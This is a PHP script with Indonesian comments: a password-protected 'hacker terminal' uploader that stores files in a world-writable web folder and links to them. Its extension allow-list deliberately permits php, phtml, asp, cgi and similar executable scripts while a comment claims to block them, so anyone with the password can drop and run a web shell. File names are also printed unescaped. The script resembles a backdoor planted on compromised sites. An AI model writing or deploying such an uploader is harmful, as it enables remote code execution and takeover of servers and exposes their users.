<?php
session_start();

// HASH Kata Sandi (Ganti dengan hash kata sandi Anda sendiri)
// Contoh: Ganti 'passwordku' dengan kata sandi yang Anda inginkan, lalu buat hash-nya:
// echo password_hash('kata_sandi_rahasia', PASSWORD_BCRYPT, ['cost' => 12]);
$PASSWORD_HASH = '$2a$12$k1eO6VFwAqIQ7XV0u0/9VuKl7eqfZ6.Gp3xQgibfOTUbT8wEO7w.6';

// --- BAGIAN LOGIN ---
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['password'])) {
        if (password_verify($_POST['password'], $PASSWORD_HASH)) {
            $_SESSION['logged_in'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "🚨 **[ACCESS DENIED]** _SYSTEM_FAILURE_ - Kredensial tidak valid.";
        }
    }

    // FORM LOGIN (Tampilan Cyberpunk)
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>NIGHT CITY ACCESS</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap'); /* Font bergaya Terminal/Hacker */
            body {
                background: #0D0D19;
                background-image: url('https://i.imgur.com/eCgXk7g.gif'); /* Gambar latar belakang Cyberpunk/Hacker */
                background-repeat: no-repeat;
                background-position: center center;
                background-size: cover;
                font-family: 'VT323', monospace;
                color: #ff0000ff; /* Neon Green/Cyan */
                text-align: center;
                padding-top: 100px;
                animation: scan-lines 1s infinite steps(10);
            }
            @keyframes scan-lines {
                from { background-position: 0 0; }
                to { background-position: 0 100%; }
            }
            form {
                background: rgba(10, 20, 30, 0.9);
                border: 2px solid #ff0000ff; /* Neon Magenta/Pink */
                box-shadow: 0 0 15px #ff0000ff;
                display: inline-block;
                padding: 30px;
                border-radius: 5px;
                backdrop-filter: blur(2px);
            }
            input[type=password] {
                background: #05050A;
                color: #FFFF00; /* Neon Yellow */
                border: 1px solid #ff0000ff;
                padding: 12px;
                width: 220px;
                margin-bottom: 15px;
                font-family: 'VT323', monospace;
                font-size: 18px;
            }
            button {
                padding: 10px 25px;
                border: none;
                background: #ff0000ff; /* Neon Magenta */
                color: #000;
                font-family: 'VT323', monospace;
                font-size: 20px;
                cursor: pointer;
                border-radius: 3px;
                transition: background 0.3s;
            }
            button:hover { 
                background: #ff0000ff; /* Neon Green/Cyan */
                color: #000;
                box-shadow: 0 0 10px #ff0000ff;
            }
            .err { 
                color: #FF0000; /* Neon Red for error */
                margin-bottom: 20px; 
                text-shadow: 0 0 5px #FF0000;
                font-size: 20px;
            }
            h2 {
                color: #ff0000ff;
                text-shadow: 0 0 10px #ff0000ff, 0 0 20px #ff0000ff;
                font-size: 36px;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
    <h2>CYBERDECK: ACCESS TERMINAL</h2>
    <?php if(isset($error)) echo "<div class='err'>$error</div>"; ?>
    <form method="POST">
        <label for="password">[[ AUTHENTICATION REQUIRED ]]</label><br>
        <input type="password" name="password" id="password" placeholder="ENTER ACCESS KEY" required><br>
        <button type="submit">_INIT_LOGIN_</button>
    </form>
    </body>
    </html>
    <?php
    exit;
}

// --- BAGIAN UPLOADER (SETELAH LOGIN BERHASIL) ---

$uploadDir = __DIR__ . "/uploads/";
if (!is_dir($uploadDir)) mkdir($uploadDir, 0777, true);

$msg = '';
$files = array_diff(scandir($uploadDir), ['.','..']);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = basename($file['name']);
    // Filter ekstensi sederhana (misalnya, untuk memblokir .php, dll.)
    $allowed_extensions = [
    'jpg', 'jpeg', 'png', 'gif', // Gambar
    'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', // Dokumen
    'zip', 'rar', '7z', 'tar', 'gz', // Arsip
    
    // EKSTENSI SKRIP/WEB: RISIKO TINGGI JIKA DIUPLOAD!
    'php', 'phtml', 'php3', 'php4', 'php5', 'phps', // File PHP
    'shtml', 'html', 'htm', // File Web/SSI
    'pl', 'cgi', // Skrip Perl/CGI
    'asp', 'aspx' // Skrip ASP
];
    $file_ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));

    if (!in_array($file_ext, $allowed_extensions)) {
        $msg = "🚫 **[FILE BLOCKED]** Ekstensi `.$file_ext` tidak diizinkan. Hanya data yang terautentikasi!";
    } elseif ($file['error'] !== 0) {
        $msg = "Upload error code: " . $file['error'];
    } elseif (move_uploaded_file($file['tmp_name'], $uploadDir . $name)) {
        $msg = "✅ **[UPLOAD SUCCESS]** Data: `{$name}` terenkripsi dan tersimpan.";
        $files = array_diff(scandir($uploadDir), ['.','..']);
    } else {
        $msg = "❌ **[UPLOAD FAILURE]** Gagal memindahkan paket data!";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>SECURE DATA TRANSMIT</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        body {
            background: #0D0D19;
            background-image: url('https://64.media.tumblr.com/bfdb2e75c8df36dcc9cb424afb3829a2/0727fe47787d0a0c-d8/s540x810/a76a693c4af7bde413ba288614b116899fcf5dfb.gif');
            background-repeat: no-repeat;
            background-position: center center;
            background-size: cover;
            font-family: 'VT323', monospace;
            color: #ff0000ff;
            text-align: center;
            padding: 50px 20px;
            min-height: 100vh;
        }
        form {
            background: rgba(10, 20, 30, 0.9);
            border: 2px solid #ff0000ff;
            box-shadow: 0 0 15px #ff0000ff;
            padding: 30px;
            border-radius: 5px;
            display: inline-block;
            margin-bottom: 30px;
            backdrop-filter: blur(2px);
        }
        h2, h3 { 
            color: #ff0000ff;
            text-shadow: 0 0 10px #ff0000ff, 0 0 5px #ff0000ff;
            font-size: 36px;
            margin-bottom: 20px;
        }
        button {
            padding: 10px 25px;
            border: none;
            background: #ff0000ff;
            color: #000;
            font-family: 'VT323', monospace;
            font-size: 20px;
            cursor: pointer;
            border-radius: 3px;
            transition: background 0.3s;
        }
        button:hover { 
            background: #ff0000ff;
            color: #000;
            box-shadow: 0 0 10px #ff0000ff;
        }
        a { 
            color: #FFFF00; /* Neon Yellow */
            text-decoration: none;
            text-shadow: 0 0 5px #FFFF00;
            transition: color 0.3s;
        }
        a:hover { color: #ff0000ff; }
        ul { 
            display: inline-block; 
            text-align: left; 
            margin-top: 20px; 
            padding-left: 0;
            list-style-type: none; /* Hilangkan bullet default */
        }
        li {
            margin-bottom: 8px;
            border-left: 3px solid #ff0000ff;
            padding-left: 10px;
        }
        input[type=file] {
            color: #ff0000ff;
            background: rgba(10, 20, 30, 0.8);
            border: 1px solid #ff0000ff;
            padding: 10px;
            font-family: 'VT323', monospace;
        }
        p {
            font-size: 18px;
            color: #ff0000ff;
            text-shadow: 0 0 5px #ff0000ff;
        }
    </style>
</head>
<body>

<h2>[ :: DATA UPLOAD TERMINAL :: ]</h2>

<?php if($msg) echo "<p><b>{$msg}</b></p>"; ?>

<form method="POST" enctype="multipart/form-data">
    <label for="file">[ TRANSMIT DATA PACKAGE ]</label><br><br>
    <input type="file" name="file" id="file" required><br><br>
    <button type="submit">_EXECUTE_UPLOAD_</button>
</form>

<h3>[ :: KLIK :: ]</h3>
<ul>
<?php foreach($files as $f): ?>
    <li>&gt; <a href="uploads/<?php echo urlencode($f); ?>" target="_blank"><?php echo $f; ?></a> - [MASUK]</li>
<?php endforeach; ?>
</ul>

</body>
</html>
